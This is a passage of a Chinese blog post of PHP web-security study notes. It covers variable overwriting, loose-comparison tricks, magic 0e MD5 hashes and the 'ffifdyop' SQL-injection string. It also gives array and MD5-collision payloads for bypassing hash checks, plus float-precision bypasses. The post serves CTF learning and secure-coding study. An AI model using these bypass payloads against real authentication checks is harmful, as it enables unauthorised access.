class="code"><pre><span class="line"><span class="title function_ invoke__">readfile</span>(filename)</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(filename)</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(filename,默认<span class="literal">false</span>)  <span class="literal">false</span>:才会将内容打印出来</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(filename)</span><br><span class="line">    </span><br><span class="line">命令执行</span><br></pre></td></tr></table></figure><h2 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&quot;example.txt&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File &#x27;<span class="subst">$filename</span>&#x27; has been deleted.&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File &#x27;<span class="subst">$filename</span>&#x27; does not exist.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="复制文件"><a href="#复制文件" class="headerlink" title="复制文件"></a>复制文件</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">copy</span>(源文件,目的文件)</span><br></pre></td></tr></table></figure><h2 id="读取目录"><a href="#读取目录" class="headerlink" title="读取目录"></a>读取目录</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;.&#x27;</span>)等价于<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>)都是得到当前目录下的文件</span><br><span class="line">以数组的形式返回</span><br></pre></td></tr></table></figure><h2 id="查找文件或目录"><a href="#查找文件或目录" class="headerlink" title="查找文件或目录"></a>查找文件或目录</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">glob() 类似于find</span><br><span class="line">以数组的形式返回</span><br></pre></td></tr></table></figure><p><img src="E:/blog/source/images/image-20220730140323897-1687422810163.png" alt="image-20220730140323897"></p><h1 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h1><ul><li><code>require()</code>:找不到被包含的文件会产生致命错误，并停止脚本运行</li><li><code>include()</code>:找不到被包含的文件只会产生警告，脚本继续执行</li><li><code>require_once()</code>与<code>require()</code>类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含</li><li><code>include_once()</code>与<code>include()</code>类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含</li></ul><h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><ul><li><p><code>extract()</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 从数组中将变量导入到当前的符号表 </span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$auth</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ?auth=true</span></span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$auth</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;over&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><code>import_request_variables()</code>–php&lt;5.4.0</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$auth</span>=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># G代表GET，P代表POST，C代表COOKIE</span></span><br><span class="line"><span class="title function_ invoke__">import_request_variables</span>( <span class="string">&#x27;G&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># xx.php?auth=1</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$auth</span>==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;private! &quot;</span>;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;public! &quot;</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><code>$$</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$$a</span>=<span class="string">&#x27;world&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span> $<span class="subst">&#123;$a&#125;</span> &quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span> <span class="subst">$hello</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;hello world hello world  <span class="comment"># $&#123;$a&#125;等同于$hello</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 存在变量覆盖Demo</span></span><br><span class="line"><span class="variable">$auth</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$auth</span>;</span><br></pre></td></tr></table></figure></li><li><p><code>parse_str(query,variabal)</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;first=value&amp;arr[]=foo+bar&amp;arr[]=baz&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 推荐用法</span></span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$str</span>, <span class="variable">$output</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>[<span class="string">&#x27;first&#x27;</span>];  <span class="comment">// value</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>[<span class="string">&#x27;arr&#x27;</span>][<span class="number">0</span>]; <span class="comment">// foo bar</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>[<span class="string">&#x27;arr&#x27;</span>][<span class="number">1</span>]; <span class="comment">// baz</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 不建议这么用</span></span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$first</span>;  <span class="comment">// value</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="number">0</span>]; <span class="comment">// foo bar</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="number">1</span>]; <span class="comment">// baz</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="用户传参"><a href="#用户传参" class="headerlink" title="用户传参"></a>用户传参</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span> </span><br><span class="line"><span class="variable">$_POST</span></span><br><span class="line"><span class="variable">$_COOKIE</span> </span><br><span class="line"><span class="variable">$_REQUEST</span> </span><br><span class="line"><span class="variable">$_FILES</span> </span><br><span class="line"><span class="variable">$_SERVER</span> </span><br><span class="line"><span class="variable">$GLOBALS</span></span><br></pre></td></tr></table></figure><h3 id="SERVER-xx"><a href="#SERVER-xx" class="headerlink" title="$_SERVER[xx]"></a>$_SERVER[xx]</h3><p>获取当前url路径的函数及服务器变量</p><p><a href="https://www.cnblogs.com/qiantuwuliang/archive/2010/02/28/1675279.html">https://www.cnblogs.com/qiantuwuliang/archive/2010/02/28/1675279.html</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&quot;QUERY_STRING&quot;</span>]：查询(query)的字符串</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&quot;PHP_SELF&quot;</span>]：当前正在执行脚本的文件名</span><br></pre></td></tr></table></figure><h2 id="获取所有变量-x2F-函数-x2F-常量"><a href="#获取所有变量-x2F-函数-x2F-常量" class="headerlink" title="获取所有变量&#x2F;函数&#x2F;常量"></a>获取所有变量&#x2F;函数&#x2F;常量</h2><ul><li><a href="https://www.php.net/manual/zh/function.get-defined-functions.php"><strong>get_defined_functions</strong></a></li><li><a href="https://www.php.net/manual/zh/function.get-defined-constants.php"><strong>get_defined_constants</strong></a></li><li><a href="https://www.php.net/manual/zh/function.get-defined-vars.php"><strong>get_defined_vars</strong></a></li></ul><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h2><p>在 PHP 中，关键字（例如<code>if</code>、 <code>else</code>、<code>while</code>、 <code>echo</code>等）、类、函数和用户定义的函数不区分大小写。</p><p>但是所有变量名都区分大小写！</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ECHO <span class="string">&quot;Hello World!&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hello World!&lt;br&gt;&quot;</span>;</span><br><span class="line">EcHo <span class="string">&quot;Hello World!&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">--&gt;Hello World!</span><br></pre></td></tr></table></figure><h2 id="PHP接收参数"><a href="#PHP接收参数" class="headerlink" title="PHP接收参数"></a>PHP接收参数</h2><p><a href="https://blog.csdn.net/bylfsj/article/details/102770461">https://blog.csdn.net/bylfsj/article/details/102770461</a></p><p><a href="https://y4tacker.blog.csdn.net/article/details/120502141">https://y4tacker.blog.csdn.net/article/details/120502141</a></p><p><strong>PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：&#x2F;?foo&#x3D;bar变成Array([foo] &#x3D;&gt; “bar”)</strong></p><p>php从请求的url中取出参数并保存之前，对参数名的操作：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.删除参数名前的一些符号</span><br><span class="line">2.将某些字符转换为下划线（尝试后[好像不能被解析为_）</span><br><span class="line">3.删除参数名后的一些符号</span><br></pre></td></tr></table></figure><p><img src="/../images/1567560448_5d6f13004035f.png" alt="img"></p><h2 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h2><p>PHP7以前的版本支持将多进制的数值转换，所以’1’&#x3D;&#x3D;’0x1’是成立的，但新版本是false。</p><h3 id="x3D-x3D-（宽松比较）"><a href="#x3D-x3D-（宽松比较）" class="headerlink" title="&#x3D;&#x3D;（宽松比较）"></a>&#x3D;&#x3D;（宽松比较）</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="literal">NULL</span> == <span class="literal">false</span> == <span class="number">0</span></span><br><span class="line">[<span class="literal">false</span>] == [<span class="number">0</span>] == [<span class="literal">NULL</span>] == [<span class="string">&#x27;&#x27;</span>]</span><br><span class="line">其他数字==True</span><br></pre></td></tr></table></figure><h4 id="数字字符串与数字"><a href="#数字字符串与数字" class="headerlink" title="数字字符串与数字"></a>数字字符串与数字</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;admin&quot;</span>==<span class="number">0</span>);  <span class="comment">//true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;1admin&quot;</span>==<span class="number">1</span>); <span class="comment">//true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;admin1&quot;</span>==<span class="number">1</span>) <span class="comment">//false</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;admin1&quot;</span>==<span class="number">0</span>) <span class="comment">//true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;   2asda&#x27;</span>==<span class="number">2</span>);<span class="comment">//true</span></span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p>这是因为在执行关系运算”&#x3D;&#x3D;“时要求运算符两边的数据类型必须一致(字符串与整型比较，字符串→整型)，当字符串转换为整型时，如果字符串以整型开头或者以空格+整型开头，就取整型的值，反之则取值0.</p><p>例子</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$passwd</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$passwd</span>==<span class="number">1234567</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">payload:passwd=<span class="number">1234567</span>sdkasj  (不要加引号,默认接收字符串参数)</span><br></pre></td></tr></table></figure><h4 id="0e科学计数法"><a href="#0e科学计数法" class="headerlink" title="0e科学计数法"></a>0e科学计数法</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;0e123456&quot;</span>==<span class="string">&quot;0e4456789&quot;</span>); <span class="comment">//true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;0e123456&quot;</span>==<span class="string">&quot;0easdasd9&quot;</span>);<span class="comment">//false</span></span><br></pre></td></tr></table></figure><p>而当字符串中含有0e&#x2F;0E时，php会将0e这类字符串识别为科学技术法的数字，而0的多少次方都等于0，所以相等。</p><h3 id="x3D-x3D-x3D-（严格比较）"><a href="#x3D-x3D-x3D-（严格比较）" class="headerlink" title="&#x3D;&#x3D;&#x3D;（严格比较）"></a>&#x3D;&#x3D;&#x3D;（严格比较）</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;0dff&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> === <span class="variable">$str</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;true&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;false&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;<span class="literal">false</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>全等于操作过程如下：<br>1.判断两边数据类型是否相同  </p><p>2.判断两边值是否相同</p><p>3.将前两步的结果进行与运算，得出最终结果</p><h3 id="MD5缺陷"><a href="#MD5缺陷" class="headerlink" title="MD5缺陷"></a><strong>MD5缺陷</strong></h3><h5 id="①MD5（string-raw）函数解析"><a href="#①MD5（string-raw）函数解析" class="headerlink" title="①MD5（string,raw）函数解析"></a>①MD5（string,raw）函数解析</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;ffifdyop&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;ffifdyop&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$b</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;<span class="number">276</span>f722736c95d99e921722cf9ed621c</span><br><span class="line"><span class="string">&#x27;or&#x27;</span><span class="number">6</span>�]��!r,��b</span><br><span class="line">当raw=<span class="literal">true</span>时，浏览器会对其返回的数据<span class="string">&#x27;or&#x27;</span><span class="number">6</span>\xc9]\x99\xe9!r,\xf9\xedb\x1c（原始二进制格式）进行了字符化处理，由此就会产生乱码。</span><br><span class="line">我们可以发现得到的字符串含有<span class="string">&#x27;or&#x27;</span><span class="number">6</span>,,可以用来进行sql注入</span><br><span class="line">如select * <span class="keyword">from</span> <span class="string">&#x27;admin&#x27;</span> where password=<span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>,<span class="literal">true</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;PHP&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$str</span>),<span class="number">8</span>,<span class="number">16</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$b</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;      <span class="number">04</span>a5c23ac138da22</span><br><span class="line"><span class="number">2</span>fec392304a5c23ac138da22847f9b7c</span><br><span class="line">我们可以发现md5的密文中，<span class="number">16</span>位密文与<span class="number">32</span>位密文的第<span class="number">8</span>-<span class="number">24</span>位子字符串是一样的。</span><br></pre></td></tr></table></figure><h5 id="②弱类型比较"><a href="#②弱类型比较" class="headerlink" title="②弱类型比较"></a>②弱类型比较</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP在处理哈希字符串时，通过!=或==来对哈希值进行比较，当哈希值开头为<span class="number">0</span>e时，在比较的时候会将其视作为科学计数法，而<span class="number">0</span>的多少次方还是<span class="number">0</span></span><br><span class="line">所以<span class="title function_ invoke__">MD5</span>(<span class="string">&#x27;QNKCDZO&#x27;</span>)==<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;s878926199a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">QNKCDZO</span><br><span class="line"><span class="number">0e830400451993494058024219903391</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">    </span><br><span class="line"><span class="number">1586264293</span></span><br><span class="line"><span class="number">0e622743671155995737639662718498</span></span><br><span class="line">    </span><br><span class="line"><span class="number">240610708</span></span><br><span class="line"><span class="number">0e462097431906509019562988736854</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="variable">$a</span>==<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)</span><br><span class="line"><span class="variable">$a</span>=<span class="number">0e215962017</span></span><br><span class="line"><span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)=<span class="number">0e291242476940776845150308577824</span></span><br></pre></td></tr></table></figure><h5 id="③强比较绕过"><a href="#③强比较绕过" class="headerlink" title="③强比较绕过"></a>③强比较绕过</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">在使用===或！==来进行强比较时</span><br><span class="line">    </span><br><span class="line">可以通过构造参数为数组类型来进行绕过</span><br><span class="line">原理：<span class="title function_ invoke__">md5</span>()函数无法处理数组类型的数值，会直接返回<span class="literal">NULL</span></span><br><span class="line">那么<span class="title function_ invoke__">MD5</span>(param1[])===<span class="title function_ invoke__">MD5</span>(param2[])从而绕过</span><br><span class="line">当然弱类型比较也可以使用这种方法来进行绕过</span><br><span class="line">    </span><br><span class="line"> <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$id</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$gg</span>) &amp;&amp; <span class="variable">$id</span> !== <span class="variable">$gg</span>)</span><br><span class="line">&gt;&gt;payload:id[]=xxx&amp;gg[]=xxx</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">但是当限制了传入的参数必须为<span class="keyword">string</span>类型时上述方法就不可以了</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">使用md5碰撞生成相同md5</span><br><span class="line"></span><br><span class="line">url编码 <span class="number">1</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%CEZr%C6%<span class="number">1</span>D%<span class="number">28</span>j%<span class="number">22</span>%<span class="number">9</span>E%<span class="number">60</span>%<span class="number">8</span>Dt%AB4%ADU%E5%<span class="number">8</span>B%<span class="number">89</span>%<span class="number">89</span>%E6j%D0FH%EE8%D1%E6%<span class="number">11</span>%<span class="number">18</span>%AB3%A6%EC%E3%B8%<span class="number">2</span>F%<span class="number">3</span>C%<span class="number">97</span>k%<span class="number">0</span>CIt%<span class="number">02</span>%<span class="number">94</span>%<span class="number">92</span>W%<span class="number">9</span>D%ED%B9%EDc%CC%<span class="number">5</span>D%<span class="number">2</span>A%A1%<span class="number">9</span>B%B3%<span class="number">7</span>B%<span class="number">27</span>%<span class="number">13</span>i%<span class="number">05</span>%<span class="number">8</span>A%A7%<span class="number">5</span>E%B3J%BE.R%A6%D7%D5%<span class="number">7</span>C%A4%<span class="number">24</span>%A5%DB%<span class="number">84</span>%D8%E7%A3%<span class="number">03</span>%E4F%EC%<span class="number">1</span>C%<span class="number">95</span>%B1%D6L%<span class="number">88</span>%AD%CD%D5%CF%B6%E8%<span class="number">26</span>%AEff%<span class="number">2</span>A%<span class="number">3</span>B%C9%D9%<span class="number">9</span>B%C8z%<span class="number">7</span>E%DB%A4m%C5%<span class="number">8</span>F%CF%<span class="number">83</span>%<span class="number">06</span>%<span class="number">5</span>E%EA%CCW%B3M%<span class="number">3</span>E%C8</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">url编码 <span class="number">1</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%CEZr%C6%<span class="number">1</span>D%<span class="number">28</span>j%<span class="number">22</span>%<span class="number">9</span>E%<span class="number">60</span>%<span class="number">8</span>Dt%AB4%ADU%E5%<span class="number">8</span>B%<span class="number">89</span>%<span class="number">09</span>%E6j%D0FH%EE8%D1%E6%<span class="number">11</span>%<span class="number">18</span>%AB3%A6%EC%E3%B8%<span class="number">2</span>F%<span class="number">3</span>C%<span class="number">97</span>k%<span class="number">0</span>CIt%<span class="number">02</span>%<span class="number">14</span>%<span class="number">93</span>W%<span class="number">9</span>D%ED%B9%EDc%CC%<span class="number">5</span>D%<span class="number">2</span>A%A1%<span class="number">9</span>B%B3%FB%<span class="number">27</span>%<span class="number">13</span>i%<span class="number">05</span>%<span class="number">8</span>A%A7%<span class="number">5</span>E%B3J%BE.R%A6%D7%D5%<span class="number">7</span>C%A4%<span class="number">24</span>%A5%DB%<span class="number">84</span>%D8%E7%<span class="number">23</span>%<span class="number">03</span>%E4F%EC%<span class="number">1</span>C%<span class="number">95</span>%B1%D6L%<span class="number">88</span>%AD%CD%D5%CF%B6%E8%<span class="number">26</span>%AEff%<span class="number">2</span>A%<span class="number">3</span>B%C9%D9%<span class="number">9</span>BHz%<span class="number">7</span>E%DB%A4m%C5%<span class="number">8</span>F%CF%<span class="number">83</span>%<span class="number">06</span>%<span class="number">5</span>E%EA%CC%D7%B3M%<span class="number">3</span>E%C8</span><br></pre></td></tr></table></figure><h2 id="语言构造器"><a href="#语言构造器" class="headerlink" title="语言构造器"></a>语言构造器</h2><p>[语言构造器和变量函数]<a href="https://segmentfault.com/q/1010000000188609">https://segmentfault.com/q/1010000000188609</a></p><p><img src="/../images/image-20220701135401603-1687677391910.png" alt="image-20220701135401603">当解释器遇到：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Hello world&#x27;</span>;</span><br></pre></td></tr></table></figure><p>这样的一个表达式的时候，并不会把它转换成函数调用，而是直接映射到一系列预先定义好的操作。使用语言构成的时候可以加括号，也可以不加括号，但是使用函数的时候必须加括号。</p><h2 id="精度缺陷"><a href="#精度缺陷" class="headerlink" title="精度缺陷"></a>精度缺陷</h2><p>php最大精度是14位，如果超出14位会衰减</p><p><img src="/../images/1598509437.png!small" alt="1598509437.png!small"></p><p><img src="/../images/1598509504.png!small" alt="1598509504.png!small"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;trick1 !== <span class="variable language_">$this</span>-&gt;trick2 &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;trick1) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;trick2) &amp;&amp; <span class="variable language_">$this</span>-&gt;trick1 != <span class="variable language_">$this</span>-&gt;trick2)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;success&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">trick1=<span class="number">0.1</span>&amp;trick2=<span class="number">0.100000000000001</span></span><br><span class="line"></span><br><span class="line">都为INF/<span class="title function_ invoke__">NAN</span>(极小/极大)</span><br></pre></td></tr></table></figure><h2 id="strcmp-–数值比较"><a href="#strcmp-–数值比较" class="headerlink" title="strcmp()–数值比较"></a>strcmp()–数值比较</h2><p>使用条件：php&gt;&#x3D;5.3</p><p>当程序逻辑进行了数值的比较时，可以尝试比较函数是否为strcmp()</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">strcmp</span> 